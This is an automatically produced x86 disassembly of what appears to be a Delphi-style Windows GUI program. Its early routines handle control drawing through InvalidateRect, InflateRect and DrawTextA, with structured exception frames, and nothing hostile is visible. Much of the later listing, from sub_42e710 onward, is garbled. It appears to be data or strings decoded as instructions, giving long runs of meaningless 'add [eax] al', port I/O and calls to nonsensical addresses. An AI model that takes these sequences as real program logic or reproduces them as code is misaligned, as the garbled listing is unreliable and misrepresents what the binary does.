mov dl 0x1
mov eax esi
call sub_4509b0
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_42e118
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44d5a8
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_42e188
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44fd34
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_44dcbc
sub_42e1c8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42e2b8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_449e20
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_44ebf8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e2bf
lea eax [ ebp - 0x14 ]
call sub_403f50
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_45071c
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_45071c
push eax
call InvalidateRect
sub_42e2c8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_42e300
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42e462
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_42de20
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_42e2c8
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_42de20
mov esi [ ebx + 0x208 ]
call sub_43dfe8
call sub_43e0c8
test al al
je r-xdata
push ebp
call sub_42e2c8
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_42de20
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_4247f4
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_424b98
mov eax ebx
call sub_4518d8
test al al
jne r-xdata
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x220 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_44c100
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_449e20
mov eax [ ebp - 0x1c ]
call sub_404410
push eax
mov eax esi
call sub_424fb8
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e469
lea eax [ ebp - 0x1c ]
call sub_403f50
retn
adc edx 0x0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_424910
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_424ed8
mov edx r-xdata
mov eax esi
call sub_424e34
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
sub_42e514
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c788
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_42e56c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44f3b0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_42e68d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44f3b0
call sub_4039b4
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_449600
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4495dc
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_42e6a8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_451220
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_42e6d4
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x21f ] 0x1
mov edx ebx
mov eax esi
call sub_4518e0
pop esi
pop ebx
retn
sub_42e710
xchg esi eax
dec eax
add [ edi ] bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ eax ] ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ecx ] ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edx ] ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ebx ] ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi + edi * 8 ] ah
add [ eax ] al
xchg esi eax
dec eax
add [ 0x640000ff ] ah
xchg esi eax
dec eax
add [ esi ] ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi ] ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ eax ] ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ecx ] ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edx ] ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
xchg esi eax
dec eax
add [ 0x640000ff ] ch
xchg esi eax
dec eax
add [ esi ] ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi ] ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ eax ] dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ecx ] dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edx ] dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ebx ] dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi + edi * 8 ] dl
add [ eax ] al
xchg esi eax
dec eax
add [ 0x640000ff ] dl
xchg esi eax
dec eax
add [ esi ] dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi ] dl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ eax ] bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ecx ] bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edx ] bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
xchg esi eax
dec eax
add [ 0x640000ff ] bl
xchg esi eax
dec eax
add [ esi ] bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi ] bl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ecx ] al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
xchg esi eax
dec eax
add [ 0x640000ff ] al
xchg esi eax
dec eax
add [ esi ] al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi ] al
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ eax ] cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ecx ] cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edx ] cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ebx ] cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi + edi * 8 ] cl
add [ eax ] al
xchg esi eax
dec eax
add [ 0x2f0000ff ] cl
add [ eax ] al
add al dh
or [ eax ] ecx
inc edx
add al ah
or [ eax ] ecx
jo r-xdata
sub al 0x42
add al ch
or [ eax ] ecx
js r-xdata
add [ eax ] al
[ eax ] ecx
inc edx
add al bl
or [ eax ] ecx
push 0xd00042e8
or [ eax ] ecx
pushad
call 0xa0ae8f8
dec eax
add [ eax - 0x18 ] bl
inc edx
add al al
or [ eax ] ecx
push eax
call 0x9fae908
dec eax
add [ eax - 0x18 ] cl
inc edx
add [ eax + 0x40004809 ] dh
call 0x9eae918
dec eax
add [ eax ] bh
call 0x9e2e920
dec eax
add [ eax ] dh
call 0x9dae928
dec eax
add [ eax ] ch
call 0x9d2e930
dec eax
add [ eax ] ah
call 0x9cae938
dec eax
add [ eax ] bl
call 0x9c2e940
dec eax
add [ eax ] dl
call 0x9bae948
dec eax
add [ eax ] cl
call 0x9b2e950
dec eax
add [ eax ] al
call 0x9aae958
dec eax
add al bh
out 0x42 eax
add [ eax + 0x9 ] ah
dec eax
add al dh
out 0x42 eax
add [ eax + 0x9 ] bl
dec eax
add al ch
out 0x42 eax
add [ eax + 0x9 ] dl
dec eax
add al ah
out 0x42 eax
add [ eax + 0x9 ] cl
dec eax
add al bl
out 0x42 eax
add [ eax + 0x9 ] al
dec eax
add al dl
out 0x42 eax
add [ eax ] bh
or [ eax ] ecx
enter 0x42e7 0x0
xor [ ecx ] cl
dec eax
add al al
out 0x42 eax
add [ eax ] ch
or [ eax ] ecx
mov eax 0x200042e7
or [ eax ] ecx
mov al 0xe7
inc edx
add [ eax ] bl
or [ eax ] ecx
test al 0xe7
inc edx
add [ eax ] dl
or [ eax ] ecx
mov al [ 0x80042e7 ]
or [ eax ] ecx
cwde
out 0x42 eax
add [ eax ] al
or [ eax ] ecx
nop
out 0x42 eax
add al bh
or [ eax ] cl
mov bh ah
inc edx
inc edx
add al ah
or [ eax ] cl
jo r-xdata
add al dh
or [ eax ] cl
and bh 0x42
add al ch
or [ eax ] cl
js r-xdata
out 0x42 eax
inc edx
add al bl
or [ eax ] cl
push 0xd00042e7
or [ eax ] cl
pushad
out 0x42 eax
add al cl
or [ eax ] cl
pop eax
out 0x42 eax
add al al
or [ eax ] cl
push eax
out 0x42 eax
add [ eax + 0x48004808 ] bh
out 0x42 eax
add [ eax + 0x40004808 ] dh
out 0x42 eax
add [ eax + 0x38004808 ] ch
out 0x42 eax
add [ eax + 0x30004808 ] ah
out 0x42 eax
add [ eax + 0x28004808 ] bl
out 0x42 eax
add [ eax + 0x20004808 ] dl
out 0x42 eax
add [ eax + 0x18004808 ] cl
out 0x42 eax
add [ eax + 0x10004808 ] al
out 0x42 eax
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42ea40
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ea47
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_4049cc
sub_42ea7c
xchg esi eax
dec eax
add [ esi ] cl
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi ] cl
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42eab1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42eab8
retn
sub_42eac4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42eaf5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42eafc
retn
mov eax [ rw-data ]
call sub_403154
sub_42ebac
or al [ eax ]
add [ eax ] al
sbb al 0xa
dec eax
add al bl
jge r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
or cl [ eax ]
xor [ edi + 0x48 ] bh
add [ eax ] al
add [ eax ] al
add ah bh
or [ eax ] ecx
rol [ eax + 0x48 ] 0x1
add [ eax ] al
clc
or [ eax ] ecx
int3
add [ eax ] al
add [ eax ] al
add [ eax ] bl
or cl [ eax ]
sbb al 0x7c
dec eax
add [ eax ] al
add [ eax ] al
add [ edx + ecx ] dl
dec eax
add [ eax + 0x487b ] ah
add [ eax ] al
add [ eax ] dl
or cl [ eax ]
loopne r-xdata
dec esp
std
dec eax
add [ eax ] al
add [ eax ] al
add [ edx + ecx ] cl
dec eax
add [ eax ] ah
jle r-xdata
push esp
in al dx
inc edx
add [ edi + edi * 8 + 0x30 ] ah
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
or cl [ eax ]
or al 0x81
dec eax
add [ eax ] al
add [ eax ] al
add [ edx + ecx ] al
dec eax
add [ eax + 0x7e ] ch
dec eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ec5b
retn
call sub_42eb90
sub_42ec88
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ecad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ecb4
retn
sub_42eccf
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42ed14
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ed1b
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4049cc
sub_42ed37
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42ed7c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ed83
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4049cc
sub_42ed93
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ede9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42edf0
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403f50
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42edfc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ee40
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ee47
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42f370
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ah dh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
hlt
sub_42f6bc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
test [ edx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor bh dh
inc edx
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
je r-xdata
nop
xor eax [ eax ]
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
adc [ edx ] al
cwde
xor eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al bh
je r-xdata
nop
insd
jae r-xdata
sub al 0xf0
inc edx
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
xor al 0x91
inc ecx
add [ eax - 0x67ffbe74 ] dl
mov [ ecx ] es
mov al [ 0xc004191 ]
xchg esi eax
inc ecx
add [ eax ] dl
xchg esi eax
inc ecx
add [ eax - 0x37ffbcfd ] ah
xchg ebp eax
inc ecx
add [ eax - 0x6dc7ffbd ] dh
inc ecx
add [ edx + edx * 4 - 0x2f7ffbf ] dh
inc edx
add [ eax ] dl
push esp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
test [ edx ] 0x2c
inc eax
add [ eax - 0x9 ] cl
inc edx
add [ edi ] al
adc [ ebx + edx * 2 + 0x74 ] dl
popad
je r-xdata
push es
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
add [ fs : eax ] al
je r-xdata
add [ eax - 0x6fffbfcd ] dl
je r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060008 ] al
insd
popad
imul ebp [ edi + 0x6e ] r-xdata
push 0x0
add bh bh
sbb [ esi + 0x45 ] ah
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
pop es
inc ebx
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
add [ ebx + edx + 0x42 ] al
add [ ebx + ecx * 4 + 0x700041 ] ch
inc ebx
add [ eax + 0x19 ] bh
inc edx
add [ ebp + ebx * 2 + 0x45 ] dh
add al dl
push 0x17540045
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax + 0x6 ] dl
inc ebx
add [ eax ] bh
sbb al [ edx ]
fcomp [ ecx ]
inc edx
add [ eax + eax + 0x43 ] ch
add [ eax + 0xc004219 ] ah
inc [ edx ]
enter 0x455e 0x0
clc
inc bp
add [ eax + 0x24004566 ] dl
push 0x45
add al ah
push es
inc ebx
add [ eax + 0x7 ] bl
inc ebx
add [ edi + eax + 0x7500043 ] cl
inc ebx
add [ ecx ] dl
push esp
push ebx
je r-xdata
inc ebp
insd
jae r-xdata
add [ 0x6d657449 ] al
adc [ eax ] al
enter 0x0 0xff
adc [ edx ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
jae r-xdata
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
cmp al bh
inc edx
add [ edi ] al
adc [ ebx + edx * 2 + 0x74 ] edx
popad
je r-xdata
test [ edx ] r-xdata
add eax [ eax ]
or [ ecx + ebp * 2 + 0x73 ] ecx
je r-xdata
add [ eax ] al
add [ eax ] al
push esi
inc ecx
add [ eax + eax + 0x680cff00 ] al
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
js r-xdata
js r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
cwde
push esi
inc ecx
add [ eax + eax ] dh
dec [ eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] cl
dec eax
insb
jo r-xdata
add [ eax ] al
[ eax ]
inc bp
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
inc ebx
add [ esp ] al
inc ebp
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
mov al 0x6
inc edx
add al ah
add [ eax ] al
add al dh
int1
inc edx
add [ edi + edx ] bh
inc edx
arpl [ esi + ebp * 2 + 0x73 ] si
add [ eax ] al
mov esp 0x42f7
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
clc
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
clc
add [ ecx ] 0x0
add [ eax ] al
or eax 0x69560700
jae r-xdata
jae r-xdata
insd
insd
mov al [ 0xffffffffc00042f1 ]
inc ebx
jne r-xdata
inc ebp
add [ ecx + ebp * 2 + 0x69cc0045 ] ah
inc ebp
add [ eax ] al
push 0x45
test [ edx ] 0xff0000d0
jl r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
add eax 0x6d657449
xchg esp eax
adc [ eax ] al
jl r-xdata
push [ eax + 0x1004564 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070004 ] al
add [ eax ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov esp 0xb00042f7
inc edx
add [ edx ] dl
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
add [ esi ] al
bound ebp [ ebp + 0x54 ]
test [ edx ] 0xd8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5 ] bl
inc edx
add [ eax ] ch
add [ eax ] al
add [ ebx + ebx * 2 + 0x44 ] cl
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
sub [ eax ] bl
inc edx
add [ esp + eax * 8 ] dl
inc esp
add [ eax + ebx + 0x42 ] bl
add [ ebp + ecx * 4 + 0x7f00044 ] al
inc ebx
add [ eax ] dh
mov es [ eax + eax - 0x20 ]
pop ss
insd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000f ] al
outsb
dec ecx
je r-xdata
int1
inc edx
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5312000c ] al
arpl [ gs : edi + 0x6e ] bp
popad
jb r-xdata
enter 0x455a 0x0
movsb [ edi ] [ esi ]
imul eax [ ebp ] sub_4569cc
add [ edx + 0x45 ] ch
outsb
dec eax
imul ebp [ esi + 0x74 ] r-xdata
dec eax
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
or [ edi + 0x6e ] cl
push ebp
pop edx
inc ebp
push ebx
push 0x4374726f
jne r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4905000a ] al
je r-xdata
inc ebx
add [ ecx ] al
add bh bh
push eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
imul ebp [ esi + 0x74 ] r-xdata
movsb [ edi ] [ esi ]
add [ eax ] al
jmp [ ecx + eax + 0x10043 ]
add eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] al
adc [ eax ] al
mov al [ 0xffffffffa4ff0000 ]
add [ ebx ] al
add [ eax ] eax
loopne r-xdata
popad
je r-xdata
jo r-xdata
inc esp
add [ edx + 0x45 ] bh
add ah ah
mov [ eax + eax - 0x5c ] es
dec edi
mov [ eax ] al
add bh bh
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
push es
jae r-xdata
bound eax [ ebp ]
cmp ah al
inc edx
add [ eax + ebx + 0x42 ] dh
je r-xdata
nop
